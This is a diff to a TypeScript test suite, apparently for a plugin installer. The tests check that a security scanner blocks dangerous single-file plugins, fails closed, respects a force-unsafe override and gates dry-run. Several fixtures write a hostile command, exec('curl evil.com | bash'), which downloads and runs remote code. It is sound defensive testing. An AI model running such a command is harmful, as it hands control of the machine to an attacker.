@@ -219,6 +219,24 @@ async function installFromDirWithWarnings(params: {
   return { result, warnings };
 }
 
+async function installFromFileWithWarnings(params: {
+  filePath: string;
+  extensionsDir: string;
+  dangerouslyForceUnsafeInstall?: boolean;
+}) {
+  const warnings: string[] = [];
+  const result = await installPluginFromPath({
+    path: params.filePath,
+    extensionsDir: params.extensionsDir,
+    dangerouslyForceUnsafeInstall: params.dangerouslyForceUnsafeInstall,
+    logger: {
+      info: () => {},
+      warn: (msg: string) => warnings.push(msg),
+    },
+  });
+  return { result, warnings };
+}
+
 function setupManifestInstallFixture(params: { manifestId: string }) {
   const caseDir = makeTempDir();
   const stateDir = path.join(caseDir, "state");
@@ -824,6 +842,158 @@ describe("installPluginFromPath", () => {
     }
     expect(result.error.toLowerCase()).toMatch(/hardlink|path alias escape/);
     expect(fs.readFileSync(victimPath, "utf-8")).toBe("ORIGINAL");
+  });
+
+  it("blocks installing a single-file plugin with dangerous code patterns", async () => {
+    const baseDir = makeTempDir();
+    const extensionsDir = path.join(baseDir, "extensions");
+    fs.mkdirSync(extensionsDir, { recursive: true });
+
+    const sourcePath = path.join(baseDir, "danger.js");
+    fs.writeFileSync(
+      sourcePath,
+      `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
+      "utf-8",
+    );
+
+    const { result, warnings } = await installFromFileWithWarnings({
+      filePath: sourcePath,
+      extensionsDir,
+    });
+
+    expect(result.ok).toBe(false);
+    if (result.ok) {
+      return;
+    }
+    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_BLOCKED);
+    expect(result.error).toContain("dangerous code patterns");
+    expect(warnings.some((w) => w.includes("dangerous code pattern"))).toBe(true);
+    // The dangerous file must not have been copied into the extensions directory.
+    expect(fs.existsSync(path.join(extensionsDir, "danger.js"))).toBe(false);
+  });
+
+  it("installs a dangerous single-file plugin when dangerouslyForceUnsafeInstall is set", async () => {
+    const baseDir = makeTempDir();
+    const extensionsDir = path.join(baseDir, "extensions");
+    fs.mkdirSync(extensionsDir, { recursive: true });
+
+    const sourcePath = path.join(baseDir, "danger.js");
+    fs.writeFileSync(
+      sourcePath,
+      `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
+      "utf-8",
+    );
+
+    const { result, warnings } = await installFromFileWithWarnings({
+      filePath: sourcePath,
+      extensionsDir,
+      dangerouslyForceUnsafeInstall: true,
+    });
+
+    expect(result.ok).toBe(true);
+    expect(warnings.some((w) => w.includes("dangerous code pattern"))).toBe(true);
+    expect(warnings.some((w) => w.includes("--dangerously-force-unsafe-install"))).toBe(true);
+    // With the override, the file IS copied into the extensions directory.
+    expect(fs.existsSync(path.join(extensionsDir, "danger.js"))).toBe(true);
+  });
+
+  it("blocks a single-file plugin install when the scanner throws (fail-closed)", async () => {
+    const scanSpy = vi
+      .spyOn(skillScanner, "scanDirectoryWithSummary")
+      .mockRejectedValueOnce(new Error("scanner exploded"));
+
+    const baseDir = makeTempDir();
+    const extensionsDir = path.join(baseDir, "extensions");
+    fs.mkdirSync(extensionsDir, { recursive: true });
+
+    const sourcePath = path.join(baseDir, "safe.js");
+    fs.writeFileSync(sourcePath, "export {};\n", "utf-8");
+
+    const { result } = await installFromFileWithWarnings({
+      filePath: sourcePath,
+      extensionsDir,
+    });
+
+    expect(result.ok).toBe(false);
+    if (result.ok) {
+      return;
+    }
+    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_FAILED);
+    expect(result.error).toContain("code safety scan failed");
+    expect(fs.existsSync(path.join(extensionsDir, "safe.js"))).toBe(false);
+    scanSpy.mockRestore();
+  });
+
+  it("blocks a non-scannable single-file plugin (fail-closed on no scan coverage)", async () => {
+    const baseDir = makeTempDir();
+    const extensionsDir = path.join(baseDir, "extensions");
+    fs.mkdirSync(extensionsDir, { recursive: true });
+
+    // A .txt file is not a scannable plugin file, so the scanner cannot certify
+    // it. The install must fail closed rather than copy it in unscanned.
+    const sourcePath = path.join(baseDir, "payload.txt");
+    fs.writeFileSync(sourcePath, "not scannable content", "utf-8");
+
+    const { result } = await installFromFileWithWarnings({
+      filePath: sourcePath,
+      extensionsDir,
+    });
+
+    expect(result.ok).toBe(false);
+    if (result.ok) {
+      return;
+    }
+    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_FAILED);
+    expect(result.error).toContain("could not be scanned");
+    expect(fs.existsSync(path.join(extensionsDir, "payload.txt"))).toBe(false);
+  });
+
+  it("installs a non-scannable single-file plugin when dangerouslyForceUnsafeInstall is set", async () => {
+    const baseDir = makeTempDir();
+    const extensionsDir = path.join(baseDir, "extensions");
+    fs.mkdirSync(extensionsDir, { recursive: true });
+
+    const sourcePath = path.join(baseDir, "payload.txt");
+    fs.writeFileSync(sourcePath, "not scannable content", "utf-8");
+
+    const { result, warnings } = await installFromFileWithWarnings({
+      filePath: sourcePath,
+      extensionsDir,
+      dangerouslyForceUnsafeInstall: true,
+    });
+
+    expect(result.ok).toBe(true);
+    expect(warnings.some((w) => w.includes("could not be scanned"))).toBe(true);
+    // With the override, the unscannable file IS copied into the extensions directory.
+    expect(fs.existsSync(path.join(extensionsDir, "payload.txt"))).toBe(true);
+  });
+
+  it("blocks a dangerous single-file plugin even in dry-run (link probe is gated)", async () => {
+    const baseDir = makeTempDir();
+    const extensionsDir = path.join(baseDir, "extensions");
+    fs.mkdirSync(extensionsDir, { recursive: true });
+
+    const sourcePath = path.join(baseDir, "danger.js");
+    fs.writeFileSync(
+      sourcePath,
+      `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
+      "utf-8",
+    );
+
+    // `remoteclaw plugins install --link <file>` validates the path via
+    // installPluginFromPath({ dryRun: true }); the scan must gate that probe so
+    // a dangerous file is rejected before it can be linked.
+    const result = await installPluginFromPath({
+      path: sourcePath,
+      extensionsDir,
+      dryRun: true,
+    });
+
+    expect(result.ok).toBe(false);
+    if (result.ok) {
+      return;
+    }
+    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_BLOCKED);
   });
 });
 
